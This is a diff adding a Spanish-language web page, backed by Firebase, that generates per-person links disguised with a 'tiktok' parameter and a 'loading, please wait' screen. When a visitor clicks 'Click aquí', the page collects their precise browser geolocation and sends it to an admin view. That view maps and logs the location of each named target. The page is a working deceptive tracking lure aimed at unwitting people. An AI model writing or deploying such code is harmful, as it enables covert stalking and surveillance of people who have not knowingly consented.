@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Cargando contenido por favor espere</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <style>
+    body { font-family: sans-serif; margin: 16px; }
+    #mapa { height: 350px; width: 100%; margin-top: 12px; }
+    button, input { padding: 10px; font-size: 15px; width: 100%; box-sizing: border-box; margin: 6px 0; }
+  </style>
+</head>
+<body>
+
+  <!-- VISTA 1: GENERAR ENLACE Y VER UBICACIÓN -->
+  <div id="adminView" style="display:none;">
+    <h3>Generar enlace de ubicación</h3>
+    <input type="text" id="nombreDestinatario" placeholder="Nombre de a quién se envía..." />
+    <button type="button" onclick="crearEnlace()">Generar nuevo enlace</button>
+    <input type="text" id="linkOutput" readonly placeholder="Aquí aparecerá tu enlace..." />
+    <button type="button" onclick="copiarLink()">Copiar enlace</button>
+    <p id="statusAdmin">Esperando coordenadas...</p>
+    <div id="mapa"></div>
+    <h4>Historial de ubicaciones</h4>
+    <div id="listaUbicaciones">Cargando lista...</div>
+    
+  </div>
+
+  <!-- VISTA 2: PERSONA QUE ABRE EL ENLACE -->
+  <div id="guestView" style="display:none;">
+    <h3>Cargando, espere...</h3>
+    <p>Click para continuar</p>
+    <button type="button" onclick="enviarUbicacion()">Click aquí</button>
+    <p id="statusGuest"></p>
+  </div>
+
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "BHjrCn0dyGq4hls8zL_X5e0Hirb...",
+      authDomain: "ubicacion-app-bd6fc.firebaseapp.com",
+      databaseURL: "https://ubicacion-app-bd6fc-default-rtdb.firebaseio.com",
+      projectId: "ubicacion-app-bd6fc"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+        function escucharListaUbicaciones() {
+      const listaEl = document.getElementById("listaUbicaciones");
+      if (!listaEl) return;
+
+      onValue(ref(db, "ubicaciones"), (snapshot) => {
+        const todo = snapshot.val();
+        if (!todo) {
+          listaEl.innerHTML = "<p>Aún no hay registros.</p>";
+          return;
+        }
+
+        const entradas = Object.entries(todo)
+          .map(([id, item]) => {
+            const ubic = item?.ultimaUbicacion || item;
+            return {
+              id,
+              nombre: item?.nombre || "Sin nombre",
+              lat: ubic?.lat,
+              lng: ubic?.lng,
+              creadoEn: item?.creadoEn || ubic?.timestamp || 0
+            };
+          })
+          .sort((a, b) => b.creadoEn - a.creadoEn);
+
+        listaEl.innerHTML = "";
+        entradas.forEach((reg) => {
+          const card = document.createElement("div");
+          card.style.border = "1px solid #ccc";
+          card.style.padding = "8px";
+          card.style.margin = "6px 0";
+          card.style.borderRadius = "6px";
+          card.style.cursor = "pointer";
+
+          const coordsTexto =
+            typeof reg.lat === "number" && typeof reg.lng === "number"
+              ? `${reg.lat.toFixed(6)}, ${reg.lng.toFixed(6)}`
+              : "Aún sin ubicación";
+
+          card.innerHTML = `<strong>${reg.nombre}</strong><br><small>${coordsTexto}</small>`;
+
+          if (typeof reg.lat === "number" && typeof reg.lng === "number") {
+            card.onclick = () => {
+              escucharUbicacion(reg.id);
+            };
+          }
+
+          listaEl.appendChild(card);
+        });
+      });
+    }
+
+    escucharListaUbicaciones();
+
+
+    const params = new URLSearchParams(window.location.search);
+    const sessionId = params.get("tiktok") || params.get("id");
+
+    if (sessionId) {
+      document.getElementById("guestView").style.display = "block";
+    } else {
+      document.getElementById("adminView").style.display = "block";
+    }
+
+    let mapa;
+    let marcador;
+
+    function escucharUbicacion(id) {
+      if (!mapa) {
+        mapa = L.map("mapa").setView([15.0, -88.0], 7);
+        L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+          attribution: "© OpenStreetMap"
+        }).addTo(mapa);
+      }
+
+            onValue(ref(db, "ubicaciones/" + id), (snapshot) => {
+        const datos = snapshot.val();
+        if (!datos) return;
+
+        const ubic = datos.ultimaUbicacion || datos;
+        if (!ubic.lat || !ubic.lng) return;
+
+        const etiquetaNombre = datos.nombre ? ` (${datos.nombre})` : "";
+        document.getElementById("statusAdmin").innerText =
+          `Ubicación recibida${etiquetaNombre}: ${ubic.lat.toFixed(6)}, ${ubic.lng.toFixed(6)}`;
+
+        mapa.setView([ubic.lat, ubic.lng], 16);
+        mapa.invalidateSize();
+        if (marcador) {
+          marcador.setLatLng([ubic.lat, ubic.lng]);
+        } else {
+          marcador = L.marker([ubic.lat, ubic.lng]).addTo(mapa);
+        }
+      });
+    }
+
+    window.crearEnlace = async function () {
+      const inputNombre = document.getElementById("nombreDestinatario");
+      const nombre = (inputNombre?.value || "").trim();
+
+      if (!nombre) {
+        document.getElementById("statusAdmin").innerText =
+          "Escribe el nombre de a quién se envía antes de generar el enlace.";
+        return;
+      }
+
+      const id = "loc_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 6);
+      const url = `${window.location.origin}${window.location.pathname}?tiktok=${id}`;
+      await set(ref(db, "ubicaciones/" + id), {
+        nombre: nombre,
+        creadoEn: Date.now()
+      });
+
+      document.getElementById("linkOutput").value = url;
+      document.getElementById("statusAdmin").innerText = `Enlace creado para: ${nombre}`;
+      inputNombre.value = "";
+      escucharUbicacion(id);
+    };
+
+    window.copiarLink = function () {
+      const input = document.getElementById("linkOutput");
+      if (!input || !input.value) return;
+      const texto = input.value;
+
+      const fallback = () => {
+        input.removeAttribute("readonly");
+        input.select();
+        document.execCommand("copy");
+        input.setAttribute("readonly", "readonly");
+      };
+
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(texto).catch(fallback);
+      } else {
+        fallback();
+      }
+    };
+
+    window.enviarUbicacion = function () {
+      const estado = document.getElementById("statusGuest");
+      if (!sessionId) return;
+      if (!navigator.geolocation) {
+        estado.innerText = "Geolocalización no disponible.";
+        return;
+      }
+
+      estado.innerText = "Obteniendo ubicación...";
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          await set(ref(db, `ubicaciones/${sessionId}/ultimaUbicacion`), {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            timestamp: Date.now()
+          });
+          estado.innerText = "Listo.";
+        },
+        (err) => {
+          estado.innerText = "Permiso denegado o error: " + err.message;
+        },
+        { enableHighAccuracy: true, timeout: 10000 }
+      );
+    };
+  </script>
+</body>
+</html>
